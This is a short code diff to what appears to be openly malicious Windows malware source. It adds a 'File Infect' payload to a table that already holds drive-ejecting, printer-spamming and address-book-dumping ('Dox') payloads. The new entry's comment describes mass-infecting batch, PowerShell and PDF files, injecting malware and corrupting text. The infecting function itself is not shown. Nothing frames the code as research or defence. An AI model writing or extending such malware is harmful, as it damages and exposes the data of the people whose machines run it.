@@ -16,6 +16,8 @@
 // 65   Eject Drives (ejeita todas as mídias ópticas/removíveis).
 // 66   War Print (imprime texto em todas as impressoras).
 // 67   Dox (mostra contatos do Windows Address Book no console).
+// 68   File Infect (MASS infect: batch + powershell + pdf,
+//        injeta malware E corrompe texto com unicode).
 // ============================================================
 
 PayloadEntry gPayloads[] =
@@ -86,6 +88,7 @@ PayloadEntry gPayloads[] =
     { L"65 - Eject Drives",            5000, GDIPayload65, false },
     { L"66 - War Print",               5000, GDIPayload66, false },
     { L"67 - Dox",                    5000, GDIPayload67, false },
+    { L"68 - File Infect",            5000, FileInfect,   false },
 };
 
 const int gPayloadCount =
